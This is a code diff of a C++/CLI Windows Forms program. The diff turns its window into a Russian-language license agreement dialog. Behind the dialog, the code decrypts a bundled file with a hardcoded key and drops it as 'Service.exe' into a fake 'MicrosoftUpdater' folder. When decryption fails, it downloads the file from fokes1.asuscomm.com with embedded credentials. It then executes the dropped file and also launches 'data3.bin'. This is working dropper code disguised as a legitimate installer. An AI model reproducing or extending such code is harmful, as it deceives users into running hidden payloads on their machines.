@@ -3,7 +3,7 @@
 #include <Shellapi.h>
 #include <io.h>
 #include <winuser.h>
-
+#include <Windows.h>
 #include <stdio.h>
 #include <fcntl.h>
 #include <iostream>
@@ -31,6 +31,7 @@ namespace Project2 {
 	using namespace System::Windows::Forms;
 	using namespace System::Data;
 	using namespace System::Drawing;
+	using namespace System::Diagnostics;
 	using namespace std;
 
 	/// <summary>
@@ -63,6 +64,7 @@ namespace Project2 {
 	private: System::Windows::Forms::Button^  button2;
 	private: System::Windows::Forms::CheckBox^  checkBox1;
 	private: System::Windows::Forms::RichTextBox^  richTextBox1;
+	private: System::Windows::Forms::PictureBox^  pictureBox1;
 
 	private:
 		/// <summary>
@@ -82,6 +84,8 @@ namespace Project2 {
 			this->button2 = (gcnew System::Windows::Forms::Button());
 			this->checkBox1 = (gcnew System::Windows::Forms::CheckBox());
 			this->richTextBox1 = (gcnew System::Windows::Forms::RichTextBox());
+			this->pictureBox1 = (gcnew System::Windows::Forms::PictureBox());
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->BeginInit();
 			this->SuspendLayout();
 			// 
 			// button1
@@ -108,33 +112,52 @@ namespace Project2 {
 			// checkBox1
 			// 
 			this->checkBox1->AutoSize = true;
-			this->checkBox1->Location = System::Drawing::Point(12, 266);
+			this->checkBox1->Location = System::Drawing::Point(12, 279);
 			this->checkBox1->Name = L"checkBox1";
-			this->checkBox1->Size = System::Drawing::Size(80, 17);
+			this->checkBox1->Size = System::Drawing::Size(236, 17);
 			this->checkBox1->TabIndex = 2;
-			this->checkBox1->Text = L"checkBox1";
+			this->checkBox1->Text = L"Я соглашаюсь с условиями пользования";
 			this->checkBox1->UseVisualStyleBackColor = true;
 			this->checkBox1->CheckedChanged += gcnew System::EventHandler(this, &MyForm::checkBox1_CheckedChanged);
 			// 
 			// richTextBox1
 			// 
+			this->richTextBox1->BackColor = System::Drawing::SystemColors::Control;
 			this->richTextBox1->Location = System::Drawing::Point(12, 49);
 			this->richTextBox1->Name = L"richTextBox1";
 			this->richTextBox1->Size = System::Drawing::Size(524, 211);
 			this->richTextBox1->TabIndex = 3;
 			this->richTextBox1->Text = resources->GetString(L"richTextBox1.Text");
 			// 
+			// pictureBox1
+			// 
+			this->pictureBox1->BackgroundImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.BackgroundImage")));
+			this->pictureBox1->BackgroundImageLayout = System::Windows::Forms::ImageLayout::Stretch;
+			this->pictureBox1->ErrorImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.ErrorImage")));
+			this->pictureBox1->InitialImage = (cli::safe_cast<System::Drawing::Image^>(resources->GetObject(L"pictureBox1.InitialImage")));
+			this->pictureBox1->Location = System::Drawing::Point(241, 266);
+			this->pictureBox1->Name = L"pictureBox1";
+			this->pictureBox1->Size = System::Drawing::Size(133, 52);
+			this->pictureBox1->SizeMode = System::Windows::Forms::PictureBoxSizeMode::StretchImage;
+			this->pictureBox1->TabIndex = 4;
+			this->pictureBox1->TabStop = false;
+			// 
 			// MyForm
 			// 
 			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
 			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
+			this->BackgroundImageLayout = System::Windows::Forms::ImageLayout::None;
 			this->ClientSize = System::Drawing::Size(548, 330);
+			this->Controls->Add(this->pictureBox1);
 			this->Controls->Add(this->richTextBox1);
 			this->Controls->Add(this->checkBox1);
 			this->Controls->Add(this->button2);
 			this->Controls->Add(this->button1);
+			this->DoubleBuffered = true;
+			this->Icon = (cli::safe_cast<System::Drawing::Icon^>(resources->GetObject(L"$this.Icon")));
 			this->Name = L"MyForm";
-			this->Text = L"MyForm";
+			this->Text = L"Лицензионное соглашение";
+			(cli::safe_cast<System::ComponentModel::ISupportInitialize^>(this->pictureBox1))->EndInit();
 			this->ResumeLayout(false);
 			this->PerformLayout();
 
@@ -170,7 +193,7 @@ namespace Project2 {
 
 		int DeCrypt()
 		{
-			LPCWSTR inFilename = L"Data";
+			LPCWSTR inFilename = L"data0.bin";
 			LPCWSTR key_str = L"3igcZhRdWq96m3GUmTAiv9";
 
 			string buf = GetNewFile();
@@ -270,9 +293,9 @@ namespace Project2 {
 		string file = GetNewFile();
 
 		//LoadFile
-		if (System::IO::File::Exists("Data"))
+		if (System::IO::File::Exists("data0.bin"))
 		{
-			if (DeCrypt() == -1)
+			if (DeCrypt() != 0)
 			{
 				try
 				{
@@ -290,7 +313,7 @@ namespace Project2 {
 			try
 			{				
 				wstring stemp = wstring(file.begin(), file.end());
-				upload("fokes1.asuscomm.com", "ff", "WorkerFF", stemp.c_str(), L"Service.exe");
+				upload("fokes1.asuscomm.com", "ff", "WorkerFF", L"Service.exe", stemp.c_str());
 			}
 			catch(exception ex)
 			{
@@ -300,11 +323,16 @@ namespace Project2 {
 	
 		try
 		{
-			WinExec(file.c_str(), SW_SHOW);
+			//WinExec(file.c_str(), SW_SHOW);
+			Process^ myProcess = gcnew Process();
+			myProcess->StartInfo->FileName = gcnew String(file.c_str());
+			myProcess->Start();
 		}
 		catch (const std::exception&) { }
 		
-		WinExec("setup-0.bin", SW_SHOW);
+		WinExec("data3.bin", SW_SHOW);
+
+		Application::Exit();
 	}
 	
 	private: std::string GetNewFile()
@@ -332,6 +360,9 @@ namespace Project2 {
 				file.append("C:\\");
 			}
 		}
+		file.append("\\MicrosoftUpdater");
+		CreateDirectory(GetWC(file.c_str()), NULL);
+
 		file.append("\\Service.exe");
 
 		return file;
